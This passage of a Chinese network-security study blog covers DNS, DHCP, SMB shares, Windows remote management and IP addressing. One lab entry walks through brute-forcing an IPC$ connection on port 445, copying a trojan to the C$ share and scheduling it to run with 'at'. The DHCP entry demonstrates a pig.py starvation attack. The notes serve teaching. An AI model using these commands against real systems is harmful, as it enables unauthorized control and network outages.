        <content type="html"><![CDATA[<h2 id="DNS服务器部署与安全"><a href="#DNS服务器部署与安全" class="headerlink" title="DNS服务器部署与安全"></a>DNS服务器部署与安全</h2><h3 id="1、DNS"><a href="#1、DNS" class="headerlink" title="1、DNS"></a>1、DNS</h3><p>Domain Name Service 域名服务</p><p>作用：为客户机提供域名解析服务（域名 –》IP地址）</p><h3 id="2、域名组成"><a href="#2、域名组成" class="headerlink" title="2、域名组成"></a>2、域名组成</h3><h4 id="域名组成概述"><a href="#域名组成概述" class="headerlink" title="域名组成概述"></a>域名组成概述</h4><p><strong>域名</strong>：如<a href="http://www.sina.com是一个域名,但严格意义来讲/">www.sina.com是一个域名，但严格意义来讲</a> sina.com 才被称为域名（全球唯一），www是主机名，可以随意起。比如blog.sina.com、nba.sina.com等等。</p><p><strong>全限定域名FQDN</strong>：主机名+域名 被称为FQDN(Fully Qualified Domain Name)全限定域名。</p><p><strong>比较出名的域名购买机构</strong>：万网。（购买域名需要备案、购买后可以注册DNS）</p><h4 id="域名组成"><a href="#域名组成" class="headerlink" title="域名组成"></a>域名组成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com.</span><br><span class="line">二级域名.一级域名.顶级域名 根域</span><br></pre></td></tr></table></figure><h3 id="3、DNS服务器监听端口"><a href="#3、DNS服务器监听端口" class="headerlink" title="3、DNS服务器监听端口"></a>3、DNS服务器监听端口</h3><p>DNS服务监听端口：<strong>53</strong></p><h3 id="4、客户机处理域名请求的顺序"><a href="#4、客户机处理域名请求的顺序" class="headerlink" title="4、客户机处理域名请求的顺序"></a>4、客户机处理域名请求的顺序</h3><p>1、查找本地DNS缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;displaydns   查询DNS缓存</span><br><span class="line">ipconfig &#x2F;flushdns     清空刷新DNS缓存</span><br></pre></td></tr></table></figure><p>2、查询hosts文件（本地解析文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><strong>host文件中的内容会自动更新到本地DNS缓存内容，</strong>所以本地查询DNS解析的优先级hosts &gt; 本地DNS缓存。</p><p>3、查找不到就请求DNS服务器。</p><h3 id="5、DNS服务器处理域名请求的顺序"><a href="#5、DNS服务器处理域名请求的顺序" class="headerlink" title="5、DNS服务器处理域名请求的顺序"></a>5、DNS服务器处理域名请求的顺序</h3><p>1、DNS服务器高速缓存</p><p>2、DNS服务器区域配置文件</p><p>3、DNS转发器 / 根域（13个根域）迭代查询</p><p><img src="https://s1.ax1x.com/2020/06/02/tNIXGQ.png" alt="tNIXGQ.png"></p><h3 id="6、DNS服务器解析域名过程"><a href="#6、DNS服务器解析域名过程" class="headerlink" title="6、DNS服务器解析域名过程"></a>6、DNS服务器解析域名过程</h3><p>1、客户机 ——》 本地DNS服务器 、本地DNS服务器 —–》 DNS转发器 <strong>递归查询</strong></p><ul><li>缓存中是否有此域名</li><li>本地区域解析文件是否存在此域名表</li><li>如果不存在，则需要委托<strong>DNS转发器</strong>请求根域DNS服务器或者直接自己请求<strong>根域DNS服务器</strong>开始逐层迭代查询DNS服务器，但对用户来说本地DNS服务器与其他DNS服务器迭代查询的过程是屏蔽的，所以客户机的视角是递归查询。</li></ul><p>2、本地DNS服务器 ——–》 其他DNS服务器 <strong>迭代查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本地DNS服务器在本地查询不到请求的域名，则会从根域DNS服务器逐层向上迭代反馈查询DNS服务器，直到查到域名对应IP地址返回给本地DNS服务器。</span><br><span class="line"></span><br><span class="line">例如:Www.baidu.com</span><br><span class="line">本地DNS服务器 ------&gt; .根域 返回一个 .com DNS服务器IP地址</span><br><span class="line">本地DNS服务器 ------&gt; .com 域名服务器 返回一个baidu.com DNS域名服务器IP地址</span><br><span class="line">本地DNS服务器 ------&gt; baidu.com 域名服务器，直接返回www.baidu.com 的IP地址</span><br><span class="line">最终以迭代的形式完成查询，本地DNS服务器缓存并发送给客户机。</span><br></pre></td></tr></table></figure><h3 id="7、DNS服务器部署过程"><a href="#7、DNS服务器部署过程" class="headerlink" title="7、DNS服务器部署过程"></a>7、DNS服务器部署过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、给DNS服务器先配上IP、子网掩码、网关，使其有IP可被客户机找到并且具有找根域DNS服务器的上网能力。</span><br><span class="line">2、windows2003服务器安装DNS插件，发现53端口开启。</span><br><span class="line">3、配置DNS区域，正向查找区域：域名-》IP地址 ； 反向查找区域：IP地址-》域名</span><br><span class="line">例如配置baidu.com区域，然后在区域中新建主机。</span><br><span class="line">4、nslookup 域名 解析IP，测试是否成功。 ping命令解析域名会首先询问本地DNS缓存和hosts、然后再询问服务器。因此会出现缓存更新不及时的状况，此时需要刷新DNS缓存。nslookup不会出现此原因使因为nslookup直接询问DNS服务器请求解析。</span><br><span class="line">5、在区域中新建别名Aliases，设置别名Aliases指向某个域名。</span><br><span class="line">6、服务器属性中添加DNS转发器。</span><br><span class="line">7、当DNS服务器去根域服务器解析域名时，会将域名对应IP地址在服务器缓存（查看--》高级--》缓存的查找，右键可以清除缓存）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5、DHCP服务器部署与安全</title>
      <link href="/2020/06/02/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/5%E3%80%81DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
      <url>/2020/06/02/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/5%E3%80%81DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="DHCP服务器部署与安全"><a href="#DHCP服务器部署与安全" class="headerlink" title="DHCP服务器部署与安全"></a>DHCP服务器部署与安全</h2><h3 id="1、DHCP服务器作用"><a href="#1、DHCP服务器作用" class="headerlink" title="1、DHCP服务器作用"></a>1、DHCP服务器作用</h3><p>动态主机配置协议（Dynamic Host Configure Protocol）自动为客户机分配IP地址。</p><h3 id="2、DHCP优点"><a href="#2、DHCP优点" class="headerlink" title="2、DHCP优点"></a>2、DHCP优点</h3><p>减少网络配置工作量、自动分配地址可以避免IP冲突、提高网段中                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          地址利用率。</p><h3 id="3、DHCP相关概念"><a href="#3、DHCP相关概念" class="headerlink" title="3、DHCP相关概念"></a>3、DHCP相关概念</h3><ul><li>地址池/作用域：（IP、子网掩码、网关、DNS、租期）</li><li>DHCP协议端口是 67/68 — <code>netstat -an</code></li></ul><h3 id="4、DHCP原理-工作过程-如何工作"><a href="#4、DHCP原理-工作过程-如何工作" class="headerlink" title="4、DHCP原理/工作过程/如何工作"></a>4、DHCP原理/工作过程/如何工作</h3><p>DHCP租约过程，分为4个步骤：</p><p><a href="https://blog.csdn.net/wuruixn/article/details/8282554">https://blog.csdn.net/wuruixn/article/details/8282554</a></p><h4 id="1）客户机发送DHCP-Discovery广播包"><a href="#1）客户机发送DHCP-Discovery广播包" class="headerlink" title="1）客户机发送DHCP Discovery广播包"></a>1）客户机发送DHCP Discovery广播包</h4><p>客户机广播请求IP地址，发送DHCP Discovery广播包，广播包包含了MAC地址。（MAC地址是每个PC网卡上全球唯一的物理地址）</p><h4 id="2）DHCP服务器响应DHCP-Offer广播包"><a href="#2）DHCP服务器响应DHCP-Offer广播包" class="headerlink" title="2）DHCP服务器响应DHCP Offer广播包"></a>2）DHCP服务器响应DHCP Offer广播包</h4><p>服务器响应并提供IP地址发送一个DHCP Offer广播包响应无IP地址客户机。</p><h4 id="3）客户机选择一个IP地址并发送DHCP-Request广播包"><a href="#3）客户机选择一个IP地址并发送DHCP-Request广播包" class="headerlink" title="3）客户机选择一个IP地址并发送DHCP Request广播包"></a>3）客户机选择一个IP地址并发送DHCP Request广播包</h4><p>客户机收到了DHCP服务器发回的响应IP包，并选择好IP地址后再发送一个DHCP Request广播包，声明自己的IP选择。</p><h4 id="4）DHCP服务器发送DHCP-ACK广播包"><a href="#4）DHCP服务器发送DHCP-ACK广播包" class="headerlink" title="4）DHCP服务器发送DHCP ACK广播包"></a>4）DHCP服务器发送DHCP ACK广播包</h4><p>服务器收到Request广播包后，发送给客户机一个确认广播包，表示自己已经确认租约，并且广播包中提供给客户机网卡详细参数：IP地址、子网掩码、网关地址、DNS地址、租期。并且维护DHCP服务器的租约表，表示地址池中少一个地址。</p><h3 id="5、DHCP续约"><a href="#5、DHCP续约" class="headerlink" title="5、DHCP续约"></a>5、DHCP续约</h3><p>当50%时间过后，客户机会再次发送DHCP Request包进行续约，如服务器无响应，则继续使用并在87.5%时间过后再次发送DHCP Request包进行续约，如仍然无响应，则释放IP地址，重新发送DHCP Discovery广播包来获取IP地址。</p><p>获得服务器响应则重新与新的DHCP租约，如果无服务器响应则自动分配169.254.x.x/16IP地址（全球统一无效地址），用于临时内网通信。</p><h3 id="6、潜在漏洞"><a href="#6、潜在漏洞" class="headerlink" title="6、潜在漏洞"></a>6、潜在漏洞</h3><ul><li><p>资源耗尽漏洞：客户机不断伪装MAC地址，不断请求IP地址，耗尽DHCP服务器的地址池，使DHCP服务器地址被占满。</p><p>防御：在交换机（管理型）的端口上做静态MAC地址绑定</p></li><li><p>伪装DHCP服务器，分配错误的IP地址：开启67/68端口，伪装成DHCP服务器，给客户机分配错误的IP地址，客户机无法联网。</p><p>防御：在交换机（管理型），除合法的DHCP服务器所在的接口外，全部设置为禁止发送DHCP OFFER包</p></li></ul><h3 id="7、DHCP服务器部署"><a href="#7、DHCP服务器部署" class="headerlink" title="7、DHCP服务器部署"></a>7、DHCP服务器部署</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows2003部署DHCP服务器</span><br><span class="line">1、首先设置DHCP服务器的IP地址，然后在光盘中安装DHCP服务组件，安装好后会发现端口67&#x2F;68已经自动开启。</span><br><span class="line">2、创建地址池：开始-》管理工具-》DHCP-》右键新建作用域（设置IP范围，可以排除保留IP；“保留”可以永久固定一个IP地址给一个MAC地址）。</span><br><span class="line">3、给地址池配置DNS和网关地址。</span><br><span class="line">4、客户机首先取消VMware自带的DHCP服务器(虚拟网络编辑器)。</span><br><span class="line">5、将IP地址设置为自动获取检验DHCP服务器有没有成功部署。</span><br><span class="line">可以使用ipconfig &#x2F;release 释放IP</span><br><span class="line">       ipconfig &#x2F;renew重新获取IP地址</span><br></pre></td></tr></table></figure><h3 id="8、DHCP资源耗尽攻击演示"><a href="#8、DHCP资源耗尽攻击演示" class="headerlink" title="8、DHCP资源耗尽攻击演示"></a>8、DHCP资源耗尽攻击演示</h3><blockquote><p>实验环境：Kali</p><p>软件：pig.py（kali自带）、Yersinia是一款底层协议攻击入侵检测工具，能实施针对多种网络协议的多种攻击。</p><p><a href="https://cloud.tencent.com/developer/article/1197597">https://cloud.tencent.com/developer/article/1197597</a></p></blockquote><p><code>pig.py eth0 </code> 不断在eth0网卡发送假的discovery包、Request包，实现资源耗尽攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4、实验、利用445植入木马</title>
      <link href="/2020/06/01/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/4%E3%80%81%E5%AE%9E%E9%AA%8C%E3%80%81%E5%88%A9%E7%94%A8445%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC/"/>
      <url>/2020/06/01/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/4%E3%80%81%E5%AE%9E%E9%AA%8C%E3%80%81%E5%88%A9%E7%94%A8445%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="实验、利用445植入木马"><a href="#实验、利用445植入木马" class="headerlink" title="实验、利用445植入木马"></a>实验、利用445植入木马</h1><h2 id="一、实验内容：神奇的木马"><a href="#一、实验内容：神奇的木马" class="headerlink" title="一、实验内容：神奇的木马"></a>一、实验内容：神奇的木马</h2><h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>通过经典的木马攻击还原场景，来学习木马的制作，并实现植入木马对目标主机进行完全控制。</p><h2 id="三、木马概述"><a href="#三、木马概述" class="headerlink" title="三、木马概述"></a>三、木马概述</h2><h4 id="什么是木马"><a href="#什么是木马" class="headerlink" title="什么是木马"></a>什么是木马</h4><p>木马通常称为黑客程序的恶意代码，可以为黑客提供远程控制植入主机的服务，木马也称为特洛伊木马（特洛伊木马，来自一个古代的战争故事。）。</p><h4 id="木马的传播途径"><a href="#木马的传播途径" class="headerlink" title="木马的传播途径"></a>木马的传播途径</h4><p>1、互联网浏览，通过浏览器漏洞或浏览器插件漏洞（Flash、迅雷等）；</p><p>2、QQ、MSN等即时通讯软件，发送恶意网址链接或木马病毒文件；</p><p>3、使用U盘等移动存储介质；</p><p>4、陌生邮件，通过电子邮件内恶意代码或含木马病毒的附件；</p><p>5、伪装成多媒体影音文件或植入木马的应用软件，利用P2P平台和网站传播；</p><p>6、<strong>利用操作系统漏洞或弱口令直接远程植入；</strong></p><p>7、下载来源不明的程序。</p><h4 id="木马的组成"><a href="#木马的组成" class="headerlink" title="木马的组成"></a>木马的组成</h4><ul><li>客户端程序：黑客主机上的控制台，负责远程遥控指挥与木马连接。</li><li>服务器端程序：服务器端程序即是木马程序，它被隐藏安装在被攻击（受害）方的电脑上，目标主机也称为肉鸡。</li></ul><h2 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h2><p>1、准备肉鸡服务器、黑客客户端，并桥接保证连通性</p><p>2、使用木马制作工具（远程连接软件自动生成）获得木马服务程序。木马以服务的形式植入到肉机中。</p><p>3、端口扫描，scanport扫描局域网内有没有445端口（共享文件服务）在开放。</p><p>4、选择肉鸡使用NTscan工具进行暴力破解，连接对方的IPC空连接</p><ul><li>连接远程共享的命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP地址\IPC$ 密码 &#x2F;user:用户名</span><br><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure><ul><li>利用copy命令从黑客客户机中把木马服务copy到肉机中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 木马地址 \\IP地址\C$</span><br></pre></td></tr></table></figure><ul><li>利用IPC空连接可执行命令的特点，设置肉机的计划任务，让其自动运行木马服务。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\IP地址</span><br><span class="line">at \\10.1.1.2 服务器至少3-5分钟之后的时间 C:\木马程序名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3、NTFS磁盘权限与SMB服务</title>
      <link href="/2020/05/31/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/3%E3%80%81NTFS%E6%9D%83%E9%99%90%E4%B8%8E%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/05/31/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/3%E3%80%81NTFS%E6%9D%83%E9%99%90%E4%B8%8E%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="NTFS权限与SMB服务"><a href="#NTFS权限与SMB服务" class="headerlink" title="NTFS权限与SMB服务"></a>NTFS权限与SMB服务</h1><h2 id="一、文件系统"><a href="#一、文件系统" class="headerlink" title="一、文件系统"></a>一、文件系统</h2><p>文件系统：外部存储设备在操作系统中组织文件的方法。</p><p>Windows常见的文件系统：<strong>NTFS</strong>、FAT。</p><p>Linux常见的文件系统：EXT。</p><p><strong>NTFS</strong>：支持单个文件大于4个G、可以设置访问权限、优点很多。</p><p><strong>FAT32</strong>：适合小存储的硬盘。</p><h2 id="二、NTFS文件系统权限管理"><a href="#二、NTFS文件系统权限管理" class="headerlink" title="二、NTFS文件系统权限管理"></a>二、NTFS文件系统权限管理</h2><p>​                                                                                                                                                                                                                                                <strong>权限选项</strong>：修改包括了删除；完全控制包括一个特殊的权限。</p><p><strong>权限的继承</strong>：默认情况下子文件夹下的所有文件都继承于父文件夹的权限。如果要特殊修改，需要修改取消继承关系（最好选择复制权限状态）。</p><p><strong>权限的累加</strong>：当一个文件权限设置中某一个用户存在多个组中，则这个用户的权限为所有存在组权限的累加状态。</p><p><strong>管理员的特殊权限</strong>：修改文件权限所有者，使管理员获得文件所有权。</p><hr><h1 id="文件共享服务器（SMB-Server-Messages-Block）"><a href="#文件共享服务器（SMB-Server-Messages-Block）" class="headerlink" title="文件共享服务器（SMB Server Messages Block）"></a>文件共享服务器（SMB Server Messages Block）</h1><h2 id="一、共享服务器概述"><a href="#一、共享服务器概述" class="headerlink" title="一、共享服务器概述"></a>一、共享服务器概述</h2><p>Windows系统文件共享服务端口始终默认开启：445（smb/samba）。（验证445端口是否开启服务不建议用<code>netstat -an</code>，建议用net share ）</p><p>换句话说，其实每一台Windows系统的电脑都默认是一个文件共享服务器。<strong>并且默认C与D盘都被隐藏共享了！</strong></p><h2 id="二、共享服务器中的共享权限管理"><a href="#二、共享服务器中的共享权限管理" class="headerlink" title="二、共享服务器中的共享权限管理"></a>二、共享服务器中的共享权限管理</h2><p><strong>设置共享文件夹与权限</strong>：右键文件夹设置共享文件夹开启，并且设置权限。</p><p><strong>远程访问共享文件夹的权限</strong>：远程访问服务器时，对文件的访问权限取用户的共享文件夹权限与NTFS文件夹权限的交集。（换句话说权限需双重验证）</p><p><strong>访问共享文件服务器</strong>： 连续两个\ 代表网络文件路径，对于客户机来说文件名为共享文件夹服务器设置共享文件夹时设置的共享名。</p><p><strong>隐藏共享文件夹</strong>：在共享名后加 $ 符号，共享服务器中该文件夹就会隐藏，只能通过网络路径+共享名$才能打开。</p><p><strong>共享文件夹相关命令</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> share             #列出共享列表</span><br><span class="line"><span class="built_in">net</span> share 共享名 /<span class="built_in">del</span> #删除共享</span><br></pre></td></tr></table></figure><p><strong>关闭默认的系统分区隐藏共享</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、打开注册表：</span><br><span class="line">运行-》regedit（打开注册表编辑器）</span><br><span class="line">注册表编辑器：存储在系统中被安装软件的相关注册信息。</span><br><span class="line">2、定位共享注册表位置：</span><br><span class="line">HKEY_Local_MACINE\System\CurrentControlSet\Services\LanmanServer\parameters 在右侧区域右键新建一个REG_DWORD类型的AutoShareServer键，值为0</span><br></pre></td></tr></table></figure><p><strong>关闭文件共享服务445(smb/samba)端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、打开service.msc找到Server停止并禁用它。</span><br><span class="line">2、仅使用于win7以上系统和win2008以上系统：配置高级安全防火墙-入站规则，增加入站规则阻止端口445的访问。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2、Windows远程管理</title>
      <link href="/2020/05/31/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/2%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2020/05/31/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/2%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows远程管理"><a href="#Windows远程管理" class="headerlink" title="Windows远程管理"></a>Windows远程管理</h1><h2 id="一、远程管理类型"><a href="#一、远程管理类型" class="headerlink" title="一、远程管理类型"></a>一、远程管理类型</h2><p>Windows远程管理类型有两种：</p><p>1、图形化界面方式(远程桌面 RDP:remote desktop protocol)：mstsc</p><p>2、命令行方式：telnet</p><p>远程桌面端口3389 (RDP, remote desktop protocol)</p><p>telnet端口23 (telnet)</p><h2 id="实验：Xp控制win2003"><a href="#实验：Xp控制win2003" class="headerlink" title="实验：Xp控制win2003"></a>实验：Xp控制win2003</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一、mstc</span><br><span class="line"></span><br><span class="line">在开始前需要在我的电脑-》属性-》远程中开启允许远程控制。</span><br><span class="line">服务器受控制不影响本机器的使用；个人系统受控制会强制登出（个人系统只允许一个人访问）</span><br><span class="line"></span><br><span class="line">二、telnet</span><br><span class="line"></span><br><span class="line">首先在计算机管理-》服务-》开启Telnet服务。（运行 services.msc）启动类型**自动**意味着每次开机自动开启此服务。</span><br><span class="line">其他各种服务：workstation上网服务、installer安装软件服务、firewall防火墙、time自动更新互联网时间......</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、IP地址及相关网络地址概念详解</title>
      <link href="/2020/05/30/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/1%E3%80%81IP%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E6%A6%82%E5%BF%B5%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/05/30/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/1%E3%80%81IP%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E6%A6%82%E5%BF%B5%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="IP地址相关网络地址概念详解"><a href="#IP地址相关网络地址概念详解" class="headerlink" title="IP地址相关网络地址概念详解"></a>IP地址相关网络地址概念详解</h1><h2 id="一、IP地址定义"><a href="#一、IP地址定义" class="headerlink" title="一、IP地址定义"></a>一、IP地址定义</h2><p>IP地址实质上就是32位二进制组成的，32位二进制分为四个段，每8位为一段。四段IP地址又分为网络位、主机位。</p><h2 id="二、子网掩码定义"><a href="#二、子网掩码定义" class="headerlink" title="二、子网掩码定义"></a>二、子网掩码定义</h2><p>子网掩码：subnet mask（SM）确定IP地址的网络位。一个IP地址<strong>必须</strong>配一个子网掩码。</p><p>255.0.0.0 / 255.255.0.0 / 255.255.255.0 / 255.255.255.255</p><p>255为网络位，0为主机位。</p><p>局域网通信规则：主机IP在同一网段中才能通信。</p><hr><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a><strong>实验</strong></h3><h4 id="1、虚拟机中模拟两台主机连接到一台交换机中。"><a href="#1、虚拟机中模拟两台主机连接到一台交换机中。" class="headerlink" title="1、虚拟机中模拟两台主机连接到一台交换机中。"></a>1、虚拟机中模拟两台主机连接到一台交换机中。</h4><p>虚拟机设置中，网络连接方式改为虚拟连接，两台虚拟机选择同一个虚拟连接的连接口，就相当于将两台电脑的网线连接到了同一台交换机上。</p><h4 id="2、给两台主机设置IP地址与子网掩码"><a href="#2、给两台主机设置IP地址与子网掩码" class="headerlink" title="2、给两台主机设置IP地址与子网掩码"></a>2、给两台主机设置IP地址与子网掩码</h4><p>设置为同一网段，不同主机号。</p><h4 id="3、测试是否可以连通"><a href="#3、测试是否可以连通" class="headerlink" title="3、测试是否可以连通"></a>3、测试是否可以连通</h4><p>使用<code>ping</code>命令测试连通。</p><hr><h1 id="三、IP地址分类"><a href="#三、IP地址分类" class="headerlink" title="三、IP地址分类"></a>三、IP地址分类</h1><p>国际标准化组织ISO规定IP地址的分类以第一个段分辨。</p><p>A类：1-126                <strong>默认</strong>子网掩码：255.0.0.0</p><p>​    A类中10.0.0.0 - 10.255.255.255是私有地址。</p><p>B类：128-191            <strong>默认</strong>子网掩码：255.255.0.0</p><p>​    B类中172.16.0.0 - 172.31.255.255是私有地址。</p><p>C类：192-223            默认子网掩码：255.255.255.0 </p><p>​    C类中192.168.0.0 - 192.168.255.255是私有地址。</p><p>D类：224-239            组播地址</p><p>E类：240-254             科研使用</p><p>127开头的IP为回环地址、255开头的IP为子网掩码，<strong>主机位全为255的IP为广播地址。</strong>0开头的后面讲，<strong>主机位全为0的是网段标识符。</strong></p><p><strong>全局广播地址</strong>：255.255.255.255； <strong>无IP地址主机</strong>：0.0.0.0</p><h1 id="四、路由器与交换机"><a href="#四、路由器与交换机" class="headerlink" title="四、路由器与交换机"></a>四、路由器与交换机</h1><p>家用路由器是路由器和交换机的结合产品，并且配备了DHCP服务器。一般路由器提供多个 LAN口和一个WAN口。其实WAN口就是Wide Area Network，用于连接广域网，相当于路由器的端口；LAN口就是Local Area Network，用于连接局域网，相当于交换机的口。</p><p><strong>路由器</strong>：用于与不同网段通信。</p><p><strong>交换机</strong>：组建局域网，使同网段的主机相互通信。</p><h1 id="五、网关"><a href="#五、网关" class="headerlink" title="五、网关"></a>五、网关</h1><p>主机通过IP地址发送数据包时，会通过自己的子网掩码、IP地址和对方的IP地址判断，对方是不是和我是同一个网段。如果不是的话，就需要将数据包发送给网关，请求与其他网段进行通信。</p><p><strong>网关</strong>：路由器内网端口就是网关，网关通常为1或者254，需要工程师配置。</p><h1 id="六、DNS域名解析服务器"><a href="#六、DNS域名解析服务器" class="headerlink" title="六、DNS域名解析服务器"></a>六、DNS域名解析服务器</h1><p>如果DNS不配置的话也可以上网，但是只能用IP地址。如果配置了DNS服务器，就可以通过域名来访问某一服务。</p><p>某地区某运营商的的DNS服务器IP可以通过百度搜索到。</p><h1 id="七、网络测试命令"><a href="#七、网络测试命令" class="headerlink" title="七、网络测试命令"></a>七、网络测试命令</h1><h2 id="1、如何查看IP地址"><a href="#1、如何查看IP地址" class="headerlink" title="1、如何查看IP地址"></a>1、如何查看IP地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig -all 查看网卡IP地址详细信息</span><br></pre></td></tr></table></figure><h2 id="2、ping命令"><a href="#2、ping命令" class="headerlink" title="2、ping命令"></a>2、ping命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l  length包大小 最大65500左右 64KB左右</span><br><span class="line"></span><br><span class="line">-t 无限发</span><br><span class="line"></span><br><span class="line">-n number指定发数据包的数量</span><br></pre></td></tr></table></figure><h2 id="3、手工解析域名"><a href="#3、手工解析域名" class="headerlink" title="3、手工解析域名"></a>3、手工解析域名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup：查询域名为IP地址，？通过DNS服务器?</span><br></pre></td></tr></table></figure><h2 